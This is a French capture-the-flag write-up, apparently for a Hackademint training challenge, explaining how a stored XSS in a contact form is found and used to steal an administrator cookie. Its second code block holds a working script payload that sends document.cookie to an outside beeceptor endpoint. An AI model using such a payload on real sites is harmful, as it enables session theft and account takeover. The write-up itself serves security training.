# Vive le fromage
## Énnoncé
Ce site de grands amateurs de fromage présente un formulaire de contact. Exploiter-le pour récupérer le cookie administrateur.

https://p2t.hackademint.org/
## Solution
En allant sur le site donné dans l'énnoncé on trouve en bas de page un formulaire de contact. Pour voler des cookies, l'idée de base à essayer quand on dispose d'un formulaire de contact est d'essayer une [attaque XSS](https://fr.wikipedia.org/wiki/Cross-site_scripting).
Pour vérifier que l'on est sur la bonne piste on va rentrer dans le formulaire de contact les lignes suivantes :
```html
<script>
alert("Faille XSS");
</script>
```
Puis on va cliquer sur 'Visualiser'.
Il y a bien une pop-up qui s'affiche avec marqué 'Faille XSS'. Le site est donc vulnérable à une attaque XSS.
Pour voler le cookie de l'administrateur il va falloir envoyer le formulaire de contact et non juste le visualiser (le code javascript s'exécutera dans le navigateur de l'admin et non plus dans le nôtre), récupérer le cookie grâce au code contenu dans la balise script et enfin trouver un moyen de le renvoyer à un endroit que l'on peut consulter.

Les cookies se récupèrent grâce à `document.cookie` dans le javascript.
Pour envoyer les cookies on peut procéder de la manière suivante :
 * utiliser https://beeceptor.com pour créer un endpoint
 * exécuter une reqête à notre endpoint grâce au code javascript en mettant en paramètre les cookies de l'administrateur
On va donc envoyer par le formulaire de contact :
```
<script>
var i=new Image;
i.src="https://starhackademint.free.beeceptor.com/?cookie="+document.cookie;
</script>
```
On reçoit alors sur beeceptor le cookie administrateur qui permet de valider le challenge